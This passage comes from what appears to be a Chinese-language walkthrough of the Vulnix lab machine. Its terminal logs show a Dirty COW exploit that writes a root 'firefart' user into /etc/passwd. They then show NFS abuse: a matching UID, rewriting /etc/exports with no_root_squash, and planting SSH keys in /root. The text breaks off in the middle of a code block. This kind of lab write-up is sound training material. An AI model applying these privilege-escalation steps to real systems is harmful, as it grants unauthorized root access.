 2024 pspy64</span><br><span class="line">drwx------  2 user user    4096 Dec 18 12:25 tmux-1000</span><br><span class="line">user@vulnix:/tmp$ </span><br><span class="line">user@vulnix:/tmp$ ./dirty </span><br><span class="line">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br><span class="line">Please enter the new password: </span><br><span class="line">Complete line:</span><br><span class="line">firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">mmap: b778f000</span><br><span class="line">madvise 0</span><br><span class="line"></span><br><span class="line">ptrace 0</span><br><span class="line">Done! Check /etc/passwd to see <span class="keyword">if</span> the new user was created.</span><br><span class="line">You can <span class="built_in">log</span> <span class="keyword">in</span> with the username <span class="string">&#x27;firefart&#x27;</span> and the password <span class="string">&#x27;1234&#x27;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DON<span class="string">&#x27;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="string">Done! Check /etc/passwd to see if the new user was created.</span></span><br><span class="line"><span class="string">You can log in with the username &#x27;</span>firefart<span class="string">&#x27; and the password &#x27;</span>1234<span class="string">&#x27;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">DON&#x27;</span>T FORGET TO RESTORE! $ <span class="built_in">mv</span> /tmp/passwd.bak /etc/passwd</span><br><span class="line">user@vulnix:/tmp$ <span class="built_in">cat</span> /etc/passwd | grep fire</span><br><span class="line">Binary file (standard input) matches</span><br><span class="line">user@vulnix:/tmp$ </span><br><span class="line">user@vulnix:/tmp$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line">/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/false</span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/false</span><br><span class="line">postfix:x:104:110::/var/spool/postfix:/bin/false</span><br><span class="line">dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false</span><br><span class="line">dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false</span><br><span class="line">landscape:x:107:113::/var/lib/landscape:/bin/false</span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br><span class="line">statd:x:109:65534::/var/lib/nfs:/bin/false</span><br><span class="line">user@vulnix:/tmp$ su firefart</span><br><span class="line">Password: </span><br><span class="line">firefart@vulnix:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(firefart) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">firefart@vulnix:/tmp<span class="comment"># </span></span><br><span class="line">firefart@vulnix:/tmp<span class="comment"># cd ~</span></span><br><span class="line">firefart@vulnix:~<span class="comment"># </span></span><br><span class="line">firefart@vulnix:~<span class="comment"># ls -al</span></span><br><span class="line">total 28</span><br><span class="line">drwx------  3 firefart root 4096 Sep  2  2012 .</span><br><span class="line">drwxr-xr-x 22 firefart root 4096 Sep  2  2012 ..</span><br><span class="line">-rw-------  1 firefart root    0 Sep  2  2012 .bash_history</span><br><span class="line">-rw-r--r--  1 firefart root 3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  2 firefart root 4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r--  1 firefart root  140 Apr 19  2012 .profile</span><br><span class="line">-r--------  1 firefart root   33 Sep  2  2012 trophy.txt</span><br><span class="line">-rw-------  1 firefart root  710 Sep  2  2012 .viminfo</span><br><span class="line">firefart@vulnix:~<span class="comment"># </span></span><br><span class="line">firefart@vulnix:~<span class="comment"># cat trophy.txt </span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br><span class="line">firefart@vulnix:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<h3 id="nfs-提权至-vulnix-用户">6.2. NFS 提权至 vulnix 用户</h3>
<p>由于第 5 步已经拿到 user 的 Shell，进一步查询 vulnix 用户 UID 得</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@vulnix:~$ <span class="built_in">cat</span> /etc/passwd | grep <span class="string">&quot;vulnix&quot;</span></span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br></pre></td></tr></table></figure>
<p>Kali 添加 vulnix</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -u 2008 vulnix</span><br></pre></td></tr></table></figure>
<p>传个 ssh 公钥上去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># su vulnix</span></span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) <span class="built_in">groups</span>=2008(vulnix)</span><br><span class="line">$     </span><br><span class="line">$ bash</span><br><span class="line">vulnix@kali:/mnt$ <span class="built_in">cd</span> home-vulnix/</span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ <span class="built_in">ls</span> -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Dec 18 23:20 ..</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile</span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ <span class="built_in">mkdir</span> .ssh</span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ </span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ <span class="built_in">cp</span> /tmp/id_rsa.pub .ssh/authorized_keys</span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ </span><br><span class="line">vulnix@kali:/mnt/home-vulnix$ <span class="built_in">ls</span> -al .ssh/</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 vulnix vulnix 4096 Dec 19  2024 .</span><br><span class="line">drwxr-x--- 3 vulnix vulnix 4096 Dec 19  2024 ..</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix  563 Dec 19  2024 authorized_keys</span><br><span class="line">vulnix@kali:/mnt/home-vulnix$</span><br></pre></td></tr></table></figure>
<p><strong>SSH 私钥登录</strong></p>
<p>从 OpenSSH 8.8 开始，<code>ssh-rsa</code>
在默认配置中被认为是弱算法，因此被禁用。由于靶机仍然依赖于
<code>ssh-rsa</code>
，客户端连接时需添加该算法，不然用私钥登录时验证不了，依旧需要密码</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.openssh.com/txt/release-8.8">OpenSSH 8.8 Release
Notes</a></p>
<p>This release disables RSA signatures using the SHA-1 hash algorithm
by default. This change has been made as the SHA-1 hash algorithm is
cryptographically broken, and it is possible to create chosen-prefix
hash collisions for &lt;USD$50K</p>
<p>For most users, this change should be invisible and there is no need
to replace ssh-rsa keys. OpenSSH has supported RFC8332 RSA/SHA-256/512
signatures since release 7.2 and existing ssh-rsa keys will
automatically use the stronger algorithm where possible.</p>
<p>Incompatibility is more likely when connecting to older SSH
implementations that have not been upgraded or have not closely tracked
improvements in the SSH protocol. For these cases, it may be necessary
to selectively re-enable RSA/SHA1 to allow connection and/or user
authentication via the HostkeyAlgorithms and PubkeyAcceptedAlgorithms
options. For example, the following stanza in ~/.ssh/config will enable
RSA/SHA1 for host and user authentication for a single destination
host:</p>
<p>Host old-host</p>
<p>HostkeyAlgorithms +ssh-rsa<br />
PubkeyAcceptedAlgorithms +ssh-rsa</p>
<p>We recommend enabling RSA/SHA1 only as a stopgap measure until legacy
implementations can be upgraded or reconfigured with another key type
(such as ECDSA or Ed25519).</p>
</blockquote>
<p>示例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># ssh  -i id_rsa  vulnix@192.168.159.5 </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.159.5 (192.168.159.5)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.159.5<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">vulnix@192.168.159.5&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># ssh  -o &#x27;PubkeyAcceptedKeyTypes=+ssh-rsa&#x27; -i id_rsa vulnix@192.168.159.5</span></span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Dec 19 19:16:54 GMT 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           97</span><br><span class="line">  Usage of /:   90.3% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 1%               IP address <span class="keyword">for</span> eth0: 192.168.159.5</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.3% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) <span class="built_in">groups</span>=2008(vulnix)</span><br><span class="line">vulnix@vulnix:~$</span><br></pre></td></tr></table></figure>
<p>也可直接在 /etc/ssh/ssh_config 添加下面两行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HostKeyAlgorithms +ssh-rsa</span><br><span class="line">PubkeyAcceptedKeyTypes +ssh-rsa</span><br></pre></td></tr></table></figure>
<h3 id="nfs-提权至-root-用户">6.3. NFS 提权至 root 用户</h3>
<p>经查 vulnix 有权编辑 NFS 配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudo -l</span><br><span class="line">Matching <span class="string">&#x27;Defaults&#x27;</span> entries <span class="keyword">for</span> vulnix on this host:</span><br><span class="line">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br><span class="line">vulnix@vulnix:~$</span><br></pre></td></tr></table></figure>
<p>修改配置共享 root 目录【<a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/zh/network-services-pentesting/nfs-service-pentesting#wei-xian-she-zhi">2049
- Pentesting NFS Service | HackTricks</a>】，传个 SSH 私钥实现提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudoedit /etc/exports </span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">cat</span> /etc/exports </span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix    *(rw,root_squash)</span><br><span class="line">/root *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
<p>重启靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># showmount -e 192.168.159.5        </span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.159.5:</span><br><span class="line">/root        *</span><br><span class="line">/home/vulnix *</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># mount -t nfs  192.168.159.5:/root /mnt/vulnix-root </span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># cd vulnix-root </span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">total 76</span><br><span class="line">drwx------ 3 root root  4096 Dec 19  2024 .</span><br><span class="line">drwxr-xr-x 4 root root  4096 Dec 19 06:47 ..</span><br><span class="line">-rw------- 1 root root     0 Sep  2  2012 .bash_history</span><br><span class="line">-rw-r--r-- 1 root root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------ 2 root root  4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r-- 1 root root   140 Apr 19  2012 .profile</span><br><span class="line">-rw------- 1 root root    49 Dec 19  2024 qterminal.pLWQPM</span><br><span class="line">-rw------- 1 root root   196 Dec 19  2024 qterminal.uOPlrB</span><br><span class="line">-rw------- 1 root root 37648 Dec 19  2024 qterminal.YgZWAM</span><br><span class="line">-r-------- 1 root root    33 Sep  2  2012 trophy.txt</span><br><span class="line">-rw------- 1 root root   710 Sep  2  2012 .viminfo</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># cat trophy.txt          </span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># mkdir .ssh</span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># cp /root/.ssh/id_rsa.pub .ssh/authorized_keys</span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">total 80</span><br><span class="line">drwx------ 4 root root  4096 Dec 19  2024 .</span><br><span class="line">drwxr-xr-x 4 root root  4096 Dec 19 06:47 ..</span><br><span class="line">-rw------- 1 root root     0 Sep  2  2012 .bash_history</span><br><span class="line">-rw-r--r-- 1 root root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------ 2 root root  4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r-- 1 root root   140 Apr 19  2012 .profile</span><br><span class="line">-rw------- 1 root root    49 Dec 19  2024 qterminal.pLWQPM</span><br><span class="line">-rw------- 1 root root   196 Dec 19  2024 qterminal.uOPlrB</span><br><span class="line">-rw------- 1 root root 37648 Dec 19  2024 qterminal.YgZWAM</span><br><span class="line">drwxr-xr-x 2 root root  4096 Dec 19  2024 .ssh</span><br><span class="line">-r-------- 1 root root    33 Sep  2  2012 trophy.txt</span><br><span class="line">-rw------- 1 root root   710 Sep  2  2012 .viminfo</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># ls -al .ssh       </span></span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root root 4096 Dec 19  2024 .</span><br><span class="line">drwx------ 4 root root 4096 Dec 19  2024 ..</span><br><span class="line">-rw-r--r-- 1 root root  563 Dec 19  2024 authorized_keys</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt/vulnix-root]</span><br><span class="line">└─<span class="comment"># cd ~/.ssh                                    </span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@192.168.159.5</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Dec 19 20:32:10 GMT 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           90</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.159.5</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">root@vulnix:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@vulnix:~<span class="comment"># ls -al</span></span><br><span class="line">total 80</span><br><span class="line">drwx------  4 root root  4096 Dec 19 20:30 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Sep  2  2012 ..</span><br><span class="line">-rw-------  1 root root     0 Sep  2  2012 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  2 root root  4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r--  1 root root   140 Apr 19  2012 .profile</span><br><span class="line">-rw-------  1 root root    49 Dec 19 20:26 qterminal.pLWQPM</span><br><span class="line">-rw-------  1 root root   196 Dec 19 20:26 qterminal.uOPlrB</span><br><span class="line">-rw-------  1 root root 37648 Dec 19 20:26 qterminal.YgZWAM</span><br><span class="line">drwxr-xr-x  2 root root  4096 Dec 19 20:31 .ssh</span><br><span class="line">-r--------  1 root root    33 Sep  2  2012 trophy.txt</span><br><span class="line">-rw-------  1 root root   710 Sep  2  2012 .viminfo</span><br><span class="line">root@vulnix:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>或者取消 /home/vulnix 所有权限制，即</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ <span class="built_in">cat</span> /etc/exports </span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix     *(rw,no_root_squash)</span><br><span class="line">vulnix@vulnix:~$ </span><br></pre></td></tr></table></figure>
<p>挂载后以 root 身份传个有 SUID 权限的 bash</p>
<p>测试发现 Kali 2024 的 bash 没法直接在靶机执行，SSH 以 vulnix
用户身份登录后将靶机的 bash 复制到自己家目录，之后 Kali 以 root
身份进去复制并加个 SUID 权限即可，具体示例如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 